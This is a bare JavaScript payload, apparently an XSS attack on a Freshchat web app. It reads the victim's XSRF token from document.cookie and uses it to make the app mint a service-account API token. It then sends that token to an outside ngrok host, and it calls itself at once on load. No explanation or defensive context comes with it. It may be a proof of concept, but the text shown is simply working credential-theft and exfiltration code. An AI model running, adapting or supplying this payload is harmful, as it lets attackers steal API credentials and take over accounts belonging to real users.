function UserAction() {
var value = "; " + document.cookie;
  var parts = value.split("; " + "FC-XSRF-TOKEN" + "=");
  if (parts.length == 2)
    token = parts.pop().split(";").shift();
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
         if (this.status == 200) {
            var fc_api_key = this.responseText;
            console.log(fc_api_key);
            var xhttp2 = new XMLHttpRequest();
            xhttp2.open("GET", "https://9e9fee9b.ngrok.io/" + fc_api_key, true);
            xhttp2.send();
         }
    };
    xhttp.open("POST", "/app/agent/service-accounts?appId=295199344559222", true);
    xhttp.setRequestHeader("X-FC-XSRF-TOKEN", token);
    var payload_json = {"serviceAccounts":[{"tokenName":"freshchat_api_token"}]}
    xhttp.send(JSON.stringify(payload_json));
} UserAction();
